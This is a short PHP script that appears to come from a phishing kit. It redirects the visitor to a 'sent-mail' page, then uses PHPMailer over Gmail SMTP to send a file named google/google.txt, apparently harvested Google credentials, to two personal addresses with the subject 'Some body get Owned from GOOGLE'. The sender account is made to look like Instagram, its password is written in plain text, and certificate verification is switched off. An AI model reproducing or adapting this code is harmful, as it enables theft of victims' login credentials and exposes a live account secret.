<?php
header('Location: sent-mail.html');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require $_SERVER['DOCUMENT_ROOT'] . '/mail/Exception.php';
require $_SERVER['DOCUMENT_ROOT'] . '/mail/PHPMailer.php';
require $_SERVER['DOCUMENT_ROOT'] . '/mail/SMTP.php';

$mail = new PHPMailer;
$mail->isSMTP(); 
$mail->SMTPDebug = 2; 
$mail->Host = "smtp.gmail.com";
$mail->Port = 587; 
$mail->SMTPSecure = 'tls';
$mail->SMTPAuth = true;
$mail->Username = 'secure.ins1agram@gmail.com';
$mail->Password = '4510aditya';
$mail->setFrom('secure.ins1agram@gmail.com', 'Friday');
$mail->addAddress('aditya.pup2@gmail.com', 'Mr. Aditya');
$mail->addAddress('saurav.pup2@gmail.com', 'Mr. Saurav');
$mail->Subject = 'Some body get Owned from GOOGLE';
$mail->msgHTML("Hello here is a surprise for you"); // message to send ,
$mail->AltBody = 'HTML messaging not supported'; // If html emails is not supported by the receiver, show this body
$mail->addAttachment('google/google.txt');
$mail->SMTPOptions = array(
                    'ssl' => array(
                        'verify_peer' => false,
                        'verify_peer_name' => false,
                        'allow_self_signed' => true
                    )
                );
if(!$mail->send()){
    echo "Mailer Error: " . $mail->ErrorInfo;
}else{
    echo "Message sent!";
}
